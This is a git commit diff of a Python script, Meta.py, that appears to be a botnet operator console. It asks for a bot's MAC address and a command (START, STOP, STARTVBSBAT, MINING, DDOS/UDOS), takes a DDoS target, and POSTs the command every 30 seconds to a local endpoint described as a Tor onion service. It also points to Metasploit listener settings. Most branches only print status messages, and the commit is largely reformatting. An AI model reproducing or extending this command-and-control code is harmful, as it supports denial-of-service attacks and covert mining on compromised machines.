5cf9ca5871a2c55865ee614e184424faeee3ff84
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-10-30 00:03:41 +0400

    Update Meta.py

--- Meta.py
+++ Meta.py
@@ -3,42 +3,41 @@ import time
 import sys
 import os
 
-
-
 # Clear screen and display banner
 os.system("clear")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Meta | lolcat")
 os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")
 
-
-
-file_to_delete = "Meta.io" 
+file_to_delete = "Meta.io"
 
 if os.path.exists(file_to_delete):
     os.remove(file_to_delete)
 
-
 while True:
     mac = input("Enter Mac: ")
     option = input("(START/STOP/STARTVBSBAT/MINING/DDOS) : ")
-    
-    if option == "DDOS":
-        target = input("Target >>> : ")
-    elif option not in ["START", "STOP", "STARTVBSBAT", "MINING", "DDOS"]:
-       python_executable = sys.executable
-       os.execl(python_executable, python_executable, *sys.argv)
-    elif option == "START":
-           print("Use Metasploit Tool in | LPORT : 8070 | LHOST : 127.0.0.1")
-
+    if option == "START":
+        print("Use Metasploit Tool in | LPORT : 8070 | LHOST : 127.0.0.1")
+    elif option == "STOP":
+        print("STOP ALL SERVICE!, Restarting Botnet >>>")
+    elif option == "DDOS" or option == "UDOS":
+        target = input("Target >>> : ")  # Prompt for target input
+    elif option == "STARTVBSBAT":
+        print("START VBS + BAT FILE")
+    elif option == "MINING":
+        print("START MINING...")
+    elif option not in ["START", "STOP", "STARTVBSBAT", "MINING", "DDOS", "UDOS"]:
+        python_executable = sys.executable
+        os.execl(python_executable, python_executable, *sys.argv)
     else:
         target = ""
-    
+
     # Define the Tor onion service URL
     tor_url = 'http://127.0.0.1:8080/Metasploit.php'
     if option == "DDOS":
-     data = {'MAC': mac, 'Option': option,'Target': target}
+        data = {'MAC': mac, 'Option': option, 'Target': target}
     else:
-     data = {'MAC': mac, 'Option': option}
+        data = {'MAC': mac, 'Option': option}
     try:
         response = requests.post(tor_url, data=data)
         if response.status_code == 200:
@@ -50,8 +49,7 @@ while True:
         print(f"Error: {str(e)}")
 
     time.sleep(30)
-    file_to_delete = "Meta.io"  
+    file_to_delete = "Meta.io"
 
     if os.path.exists(file_to_delete):
-     os.remove(file_to_delete)
-
+        os.remove(file_to_delete)
